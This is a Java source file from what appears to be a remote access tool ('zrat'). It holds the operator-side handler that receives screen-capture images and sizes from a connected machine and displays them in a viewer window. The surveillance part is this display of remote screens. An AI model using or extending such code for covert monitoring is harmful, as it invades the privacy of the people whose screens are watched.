package com.zrat.client.nio.handler;

import java.io.ByteArrayInputStream;
import java.util.Map;

import org.jboss.netty.channel.ChannelHandlerContext;
import org.jboss.netty.channel.MessageEvent;
import org.jboss.netty.channel.ChannelHandler.Sharable;

import com.zrat.client.controller.ScreenService;
import com.zrat.client.ui.ScreenFrame;
import com.zrat.transfer.model.TransferDataStruct;

@Sharable
public class ScreenHandler extends ClientNIOHandler{

	@SuppressWarnings("unchecked")
	@Override
	public void processMessage(ChannelHandlerContext ctx, MessageEvent e) {
		if (e.getMessage() instanceof TransferDataStruct) {
			
			TransferDataStruct data = ((TransferDataStruct) e.getMessage());
			String command = data.getAction();
			Map<String,Object> map = (Map<String, Object>) data.getObject();
			if (ScreenService.COMMAND_CAPTRUE.equals(command)) {
				int x = Integer.parseInt( map.get(ScreenService.X)+"");
				int y = Integer.parseInt(map.get(ScreenService.Y)+"");
				ScreenFrame frame = server.getScreenFrame();
				ByteArrayInputStream input = new ByteArrayInputStream((byte[])map.get(ScreenService.IMG));
				frame.getScreenLabel().refresh(x,y,input);
			}else if (ScreenService.COMMAND_START.equals(command)){
				int x = Integer.parseInt(map.get(ScreenService.SCREEN_WIDTH)+"");
				int y = Integer.parseInt(map.get(ScreenService.SCREEN_HEIGHT)+"");
				int width=Integer.parseInt(map.get(ScreenService.C_WIDTH)+"");
				int height=Integer.parseInt(map.get(ScreenService.C_HEIGHT)+"");
				server.getScreenFrame().getScreenLabel().setCell_height(height);
				server.getScreenFrame().getScreenLabel().setCell_width(width);
				server.getScreenFrame().getScreenLabel().setScreenSize(x, y);
//				int[] image = (int[]) map.get(ScreenService.IMG);
//				ScreenFrame frame = server.getScreenFrame();
//				frame.getScreenLabel().refresh(x,y,image);
//				server.getScreenFrame().setVisible(true);
				
			}
			else{
				ctx.sendUpstream(e);
			}
		}
		else{
			ctx.sendUpstream(e);
		}
//		if (e.getMessage() instanceof TransferDataStruct){
//			TransferDataStruct data = (TransferDataStruct)e.getMessage();
//			
//			if (ScreenService.COMMAND_CAPTRUE.equals(data.getAction())){
//				ScreenFrame frame = RatUIManager.getMainPanel().getCurrentServer().getScreenFrame();
//				Map<String,Object> map = (Map<String, Object>) data.getObject();
//				byte[] img = (byte[]) map.get(ScreenService.IMG);
//				int x = Integer.valueOf(map.get(ScreenService.X) + "");
//				int y = Integer.valueOf(map.get(ScreenService.Y) + "");
//				frame.getScreenLabel().refresh(x,y,img);
//			}else if (ScreenService.COMMAND_START.equals(data.getAction())){
//				Map<String,Object> map = (Map<String, Object>) data.getObject();
//				
//				byte[] img = (byte[]) map.get(ScreenService.IMG);
//				int x = Integer.valueOf(map.get(ScreenService.X) + "");
//				int y = Integer.valueOf(map.get(ScreenService.Y) + "");
//				RatUIManager.getMainPanel().getCurrentServer().setScreenFrame(new ScreenFrame(x, y)).getScreenLabel().refresh(0,0,img);
//				RatUIManager.getMainPanel().getCurrentServer().getScreenFrame().setVisible(true);
//			}
//		}
		
	}

}
